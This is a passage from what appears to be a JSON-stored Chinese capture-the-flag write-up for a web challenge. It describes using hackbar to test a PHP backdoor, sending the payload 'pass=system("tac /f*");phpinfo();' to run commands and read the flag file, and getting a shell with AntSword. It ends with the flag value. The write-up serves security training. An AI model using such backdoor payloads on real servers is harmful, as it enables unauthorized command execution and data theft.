alt=\"\"></p>\n<p>同样输出 a</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8hx3yPpXbUo5X8bg.png!thumbnail\" alt=\"\"></p>\n<p>以二为例使用 hackbar 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/p7IqyHJCWU1CxMBu.png!thumbnail\" alt=\"\"></p>\n<p>测试后门成功，接着利用语句</p>\n<p><strong>pass=system(“tac /f*”);phpinfo();</strong></p>\n<p>获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rRsBGl2FXPPYxNmI.png!thumbnail\" alt=\"\"></p>\n<p>以二为例利用蚁剑 getshell 获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n8RKBNlu3UG6FhCz.png!thumbnail\" alt=\"\"></p>\n<p>在根目录下找到 flag</p>\n<p><strong>flag{51191745789e4c01bc43f0e3b157e281}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        }
    ]
}